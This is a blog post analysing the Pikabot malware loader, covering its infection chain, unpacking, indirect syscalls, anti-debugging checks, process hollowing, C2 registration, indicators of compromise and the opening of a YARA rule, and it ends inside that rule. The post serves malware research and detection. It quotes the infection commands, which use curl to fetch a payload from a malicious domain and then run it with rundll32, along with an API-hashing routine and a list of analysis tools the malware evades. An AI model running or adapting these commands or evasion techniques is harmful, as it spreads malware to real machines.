<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Pikabot Analysis - cr4ck3d</title><meta name="Description" content=""><meta property="og:title" content="Pikabot Analysis" />
<meta property="og:description" content="Executive Summary Pikabot used indirect syscalls to evade detection. Pikabot used RC4 for strings encryption/decryption. Pikabot used varouis anti-analysis techniques to slow down the analysis. Infection Chain The infection chain start with running a copy of the legitimate file for Windows Write (write.exe) that will side-loads malicious DLL named edputil.dll, then it will download the packed Pikabot DLL. after unpacking the Pikabot Loader will decrypt and inject the core module into the created process &ldquo;ctfmon." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/2024/04/pikabot/" /><meta property="og:image" content="http://localhost:1313/logo.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-04-13T16:22:14+00:00" />
<meta property="article:modified_time" content="2024-04-13T16:22:14+00:00" /><meta property="og:site_name" content="Cr4CK3DD" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/logo.png" /><meta name="twitter:title" content="Pikabot Analysis"/>
<meta name="twitter:description" content="Executive Summary Pikabot used indirect syscalls to evade detection. Pikabot used RC4 for strings encryption/decryption. Pikabot used varouis anti-analysis techniques to slow down the analysis. Infection Chain The infection chain start with running a copy of the legitimate file for Windows Write (write.exe) that will side-loads malicious DLL named edputil.dll, then it will download the packed Pikabot DLL. after unpacking the Pikabot Loader will decrypt and inject the core module into the created process &ldquo;ctfmon."/>
<meta name="application-name" content="cr4ck3d">
<meta name="apple-mobile-web-app-title" content="cr4ck3d"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/2024/04/pikabot/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Pikabot Analysis",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/2024\/04\/pikabot\/"
        },"genre": "posts","wordcount":  1102 ,
        "url": "http:\/\/localhost:1313\/2024\/04\/pikabot\/","datePublished": "2024-04-13T16:22:14+00:00","dateModified": "2024-04-13T16:22:14+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "cr4ck3d"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="cr4ck3d"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Blog"><i class="fa-solid fa-square-pen"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tag"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="cr4ck3d"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-3" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="Blog"><i class="fa-solid fa-square-pen"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tag"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pikabot Analysis</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://cr4ck3d.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cr4ck3d</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Malware</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-04-13">2024-04-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1102 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/pikabot.jpeg"
        data-srcset="/images/pikabot.jpeg, /images/pikabot.jpeg 1.5x, /images/pikabot.jpeg 2x"
        data-sizes="auto"
        alt="/images/pikabot.jpeg"
        title="/images/pikabot.jpeg" width="1024" height="612" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#executive-summary">Executive Summary</a></li>
    <li><a href="#infection-chain">Infection Chain</a>
      <ul>
        <li><a href="#unpacking">Unpacking</a></li>
      </ul>
    </li>
    <li><a href="#pikabot-loader">Pikabot Loader</a>
      <ul>
        <li><a href="#indirect-syscall">Indirect syscall</a></li>
        <li><a href="#anti-debugging">Anti-debugging</a></li>
        <li><a href="#process-hollowing">Process Hollowing</a></li>
      </ul>
    </li>
    <li><a href="#pikabot-core">Pikabot Core</a></li>
    <li><a href="#iocs">IOCs</a></li>
    <li><a href="#detection">Detection</a>
      <ul>
        <li><a href="#yara">YARA</a></li>
      </ul>
    </li>
    <li><a href="#downloads">Downloads</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="executive-summary">Executive Summary</h2>
<ul>
<li><em>Pikabot</em> used indirect syscalls to evade detection.</li>
<li><em>Pikabot</em> used RC4 for strings encryption/decryption.</li>
<li><em>Pikabot</em> used varouis anti-analysis techniques to slow down the analysis.</li>
</ul>
<h2 id="infection-chain">Infection Chain</h2>
<p>The infection chain start with running a copy of the legitimate file for Windows Write (write.exe) that will side-loads malicious DLL named edputil.dll, then it will download the packed Pikabot DLL.
after unpacking the Pikabot Loader will decrypt and inject the core module into the created process &ldquo;ctfmon.exe&rdquo;.</p>
<p><div class="mermaid" id="id-1"></div>
<em>Figure 1. Pikabot Infection Chain</em></p>
<p><strong>The loaded DLL runs multiple commands to download and run the Pikabot malware.</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">    cmd /c data\\document.rtf&#34;
</span></span><span class="line"><span class="cl">    cmd.exe /c md c:\\wnd
</span></span><span class="line"><span class="cl">    cmd.exe /c curl.exe --output c:\\wnd\\3291.png --url https://yourunitedlaws.com/mrD/4462
</span></span><span class="line"><span class="cl">    rundll32 c:\\wnd\\3291.png,GetModuleProp
</span></span></code></pre></td></tr></table>
</div>
</div><p align="center">
  <img src="/images/download-pikabot.png">
</p>
<p><em>Figure 2. commands executed by edputil.dll</em></p>
<h3 id="unpacking">Unpacking</h3>
<p><strong>The loader extracts its stage 2 payload from the <code>.rsrc</code> section, It then decrypts it.</strong></p>
<p align="center">
  <img src="/images/decrypting.png">
</p>
<p><em>Figure 3. Decrypting <code>.rsrc</code> section.</em></p>
<p><strong>The next step of the process is to reflectively load the PE file within the currently executing process. This technique involves dynamically loading the PE file&rsquo;s contents into memory and executing it, without the need for the file to be physically written to disk.</strong></p>
<p align="center">
  <img src="/images/copy-headers.png">
  <img src="/images/copy-sections.png">
  <img src="/images/fix-reloc.png">
  <img src="/images/run-stage-2.png">
</p>
<p><em>Figure 4. Reflectively loading PE.</em></p>
<h2 id="pikabot-loader">Pikabot Loader</h2>
<h3 id="indirect-syscall">Indirect syscall</h3>
<p><strong>Pikabot used Indirect syscalls to stay under the radar and evade EDR user-land hooking, as well as debugging attempts.</strong></p>
<p align="center">
  <img src="/images/indirect-syscall.png">
</p>
<p><em>Figure 4. Indirect syscall.</em></p>
<h3 id="anti-debugging">Anti-debugging</h3>
<p><strong>The Pikabot Loader runs multiple checks using NtQuerySystemInformation and NtQueryInformationProcess to detect if it&rsquo;s beign debugged.</strong></p>
<p align="center">
  <img src="/images/anti-debug-check-1.png">
  <img src="/images/anti-debug-check-2.png">
  <img src="/images/anti-debug-check-3.png">
  <img src="/images/anti-debug-check-4.png">
</p>
<p><em>Figure 5. Anti-debugging checks.</em></p>
<p><strong>The Loader will resolve APIs from ntdll and kernel32 dll by hash, and store them into a global structure</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">ctx</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">is_bieng_debugg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">LdrLoadDll</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">LdrGetProcedureAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">RtlAllocateHeap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">RtlFreeHeap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">RtlDecompressBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">RtlCreateProcessParametersEx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">RtlDestroyProcessParameters</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">ExitProcess</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">CheckRemoteDebuggerPresent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">VirtualAlloc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">GetThreadContext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">VirtualFree</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">Process32FirstW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">Process32NextW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">ntdll</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">kernel32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">dw1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">core_module_payload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">core_module_payload_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="n">DWORD</span> <span class="n">Teb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>API hashing algorithm used by the loader :</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_hash</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">hash</span> <span class="o">=</span> <span class="mh">0x1EC8</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x60</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">hash</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">33</span> <span class="o">*</span> <span class="nb">hash</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">hash</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">33</span> <span class="o">*</span> <span class="nb">hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">hash</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Next, the Loader will check for list of process. if any process is running, the malware will exit without loading the core module. these are the process that is being checked:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">	- ProcessHacker.exe
</span></span><span class="line"><span class="cl">	- tcpview.exe
</span></span><span class="line"><span class="cl">	- autorunsc.exe
</span></span><span class="line"><span class="cl">	- filemon.exe
</span></span><span class="line"><span class="cl">	- procmon.exe
</span></span><span class="line"><span class="cl">	- regmon.exe
</span></span><span class="line"><span class="cl">	- procexp.exe
</span></span><span class="line"><span class="cl">	- idaq.exe
</span></span><span class="line"><span class="cl">	- idaq64.exe
</span></span><span class="line"><span class="cl">	- x32dbg.exe
</span></span><span class="line"><span class="cl">	- x64dbg.exe
</span></span><span class="line"><span class="cl">	- Fiddler.exe
</span></span><span class="line"><span class="cl">	- httpdebugger.exe
</span></span><span class="line"><span class="cl">	- cheatengine-i386.exe
</span></span><span class="line"><span class="cl">	- cheatengine-x86_64.exe
</span></span><span class="line"><span class="cl">	- cheatengine-x86_64-SSE4-AVX2.exe
</span></span><span class="line"><span class="cl">	- LordPE.exe
</span></span><span class="line"><span class="cl">	- SysInspector.exe
</span></span><span class="line"><span class="cl">	- sniff_hit.exe
</span></span><span class="line"><span class="cl">	- windbg.exe
</span></span><span class="line"><span class="cl">	- joeboxcontrol.exe
</span></span><span class="line"><span class="cl">	- joeboxserver.exe
</span></span><span class="line"><span class="cl">	- ResourceHacker.exe
</span></span><span class="line"><span class="cl">	- dumpcap.exe
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="process-hollowing">Process Hollowing</h3>
<p><strong>Pikabot Loader stores the core module in the <code>.data</code> section in base64-encoded chunks, each chunk encrypted with RC4 and have a unique key. After decoding and decrypting the core module, The Loader launch <code>ctfmon.exe</code> process and inject it with the core module.</strong></p>
<p align="center">
  <img src="/images/inject-1.png">
  <img src="/images/inject-2.png">
  <img src="/images/inject-3.png">
</p>
<p><em>Figure 6. using <code>RtlCreateProcessParametersEx</code>, <code>NtCreateUserProcess</code>, <code>RtlDestroyProcessParameters</code> to create process.</em></p>
<p><strong>After Decompressing the payload with <code>RtlDecompressBuffer</code>, it will use <a href="https://attack.mitre.org/techniques/T1055/012/" target="_blank" rel="noopener noreffer ">Process Hollowing</a> technique to inject the core module.</strong></p>
<p align="center">
  <img src="/images/decompress-buffer.png">
</p>
<p><em>Figure 7. Decompressing the payload with <code>RtlDecompressBuffer</code></em></p>
<p align="center">
  <img src="/images/inject-4.png">
  <img src="/images/inject-5.png">
</p>
<p><em>Figure 8. Process Hollowing</em></p>
<h2 id="pikabot-core">Pikabot Core</h2>
<p><strong>PIKABOT Loads and uses API hashing to resolve needed libraries at runtime. Next, it validates the victim machine by verifying the language identifier using GetUserDefaultLangID. If the LangID is set to Russian (0x419) or Ukranian (0x422), the malware will immediately stop its execution.</strong></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/check-system-language.png"
        data-srcset="/images/check-system-language.png, /images/check-system-language.png 1.5x, /images/check-system-language.png 2x"
        data-sizes="auto"
        alt="/images/check-system-language.png"
        title="/images/check-system-language.png" width="400" height="79" /></p>
<p><em>Figure 9. Checking system language</em></p>
<p><strong>Pikabot creates a mutex to prevent reinfection on the same machine. Mutex: {A7C67034-A769-4D94-B727-B30C6C7F66FC}</strong>
<strong>Next, the Core will extract its confugiration, which will contain IP addresses, URIs, Pikabot version, and additional HTTP headers.</strong></p>
<p align="center">
  <img src="/images/config.png">
</p>
<p><em>Figure 10. Pikabot core config</em></p>
<p><strong>The next phase involves collecting victim machine information :</strong></p>
<ul>
<li>Retrieves the name of the user associated with the PIKABOT thread.</li>
<li>Retrieves the computer name.</li>
<li>Gets processor information.</li>
<li>Grabs display device information using EnumDisplayDevicesW.</li>
<li>Retrieves domain controller information using DsGetDcNameW.</li>
<li>Collects current usage around physical and virtual memory using GlobalMemoryStatusEx.</li>
<li>Gets the window dimensions using GetWindowRect used to identify sandbox environments.</li>
<li>Retrieves Windows OS product information using RtlGetVersion.</li>
<li>Uses CreateToolhelp32Snapshot to retrieve process information.</li>
</ul>
<p><strong>The collected victim machine information will be encrypted with random generated key and random generated number of bytes to shift from the end of the encrypted data to the start of the encrypted data.</strong></p>
<p align="center">
  <img src="/images/collected-system-infos.png">
</p>
<p><em>Figure 11. Initial request Body</em></p>
<p><strong>Pikabot registers the bot by sending previously collected information to a random URI.</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">api/auth.revoke
</span></span><span class="line"><span class="cl">api/apps.permissions.info
</span></span><span class="line"><span class="cl">api/admin.conversations.restrictAccess.removeGroup
</span></span><span class="line"><span class="cl">api/admin.emoji.add
</span></span><span class="line"><span class="cl">api/admin.apps.restrict
</span></span><span class="line"><span class="cl">api/auth.test
</span></span><span class="line"><span class="cl">api/admin.conversations.archive
</span></span><span class="line"><span class="cl">api/admin.conversations.restrictAccess.addGroup
</span></span><span class="line"><span class="cl">api/apps.event.authorizations.list
</span></span><span class="line"><span class="cl">api/admin.emoji.addAlias
</span></span><span class="line"><span class="cl">api/admin.conversations.getConversationPrefs
</span></span><span class="line"><span class="cl">api/admin.users.setOwner
</span></span><span class="line"><span class="cl">api/admin.inviteRequests.approved.list
</span></span><span class="line"><span class="cl">api/admin.conversations.create
</span></span><span class="line"><span class="cl">api/admin.conversations.inviteBapi/admin.usergroups.listChannels
</span></span><span class="line"><span class="cl">api/apps.permissions.users.request
</span></span><span class="line"><span class="cl">api/admin.users.remove
</span></span><span class="line"><span class="cl">api/admin.conversations.ekm.listOriginalConnectedChannelInfo
</span></span><span class="line"><span class="cl">api/admin.inviteRequests.denied.list
</span></span><span class="line"><span class="cl">api/admin.apps.approve
</span></span><span class="line"><span class="cl">api/admin.users.list
</span></span><span class="line"><span class="cl">api/admin.emoji.list
</span></span><span class="line"><span class="cl">api/admin.conversations.rename
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Next, Pikabot will Request for next commands to execute.</strong></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/c2-cmds.png"
        data-srcset="/images/c2-cmds.png, /images/c2-cmds.png 1.5x, /images/c2-cmds.png 2x"
        data-sizes="auto"
        alt="/images/c2-cmds.png"
        title="/images/c2-cmds.png" width="792" height="505" /></p>
<h2 id="iocs">IOCs</h2>
<table>
<thead>
<tr>
<th>Type</th>
<th>Indicator</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>IPv4</td>
<td>94.72.104[.]77:13724</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>154.12.236[.]248:13786</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>84.46.240[.]42:2083</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>94.72.104[.]80:5000</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>198.38.94[.]213:2224</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>45.77.63[.]237:22</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>70.34.199[.]64:9785</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>70.34.223[.]164:9785</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>70.34.223[.]164:5000</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>158.247.240[.]58:22</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>154.53.55[.]165:13783</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>IPv4</td>
<td>209.126.86[.]48:1194</td>
<td></td>
<td>Pikabot C2 server</td>
</tr>
<tr>
<td>Domain</td>
<td>yourunitedlaws[.]com</td>
<td></td>
<td>Hosting infra for Pikabot loader</td>
</tr>
<tr>
<td>SHA-256</td>
<td>905a3a144f94a38ac6059759879caec19cff446b98c24bb2035b3293330e03b2</td>
<td>edputil.dll</td>
<td>Side-loaded DLL used to download Pikabot loader</td>
</tr>
<tr>
<td>SHA-256</td>
<td>fb8e3ef19f0a3ad298b8d315a716aae1151332c1f097296962a3a04017f940ae</td>
<td></td>
<td>Downloaded Pikabot DLL</td>
</tr>
<tr>
<td>SHA-256</td>
<td>6c5f88c7d2bc6f75264eecc733e74f9b5aa88a54881978dabbc68a8aa5928fc8</td>
<td></td>
<td>Pikabot loader</td>
</tr>
<tr>
<td>SHA-256</td>
<td>cfcf2c1f9f72e719d7a50f0a07c081b8353ae8c04dff2ea9284230539a59d7ac</td>
<td></td>
<td>Pikabot core</td>
</tr>
<tr>
<td>Mutex</td>
<td>{A7C67034-A769-4D94-B727-B30C6C7F66FC}</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="detection">Detection</h2>
<h3 id="yara">YARA</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rule</span> <span class="n">Pikabot_loader</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nl">meta</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    	<span class="n">author</span>      <span class="o">=</span> <span class="s">&#34;Cr4CK3d&#34;</span>
</span></span><span class="line"><span class="cl">    	<span class="n">description</span> <span class="o">=</span> <span class="s">&#34;Detect Pikabot Loader&#34;</span>
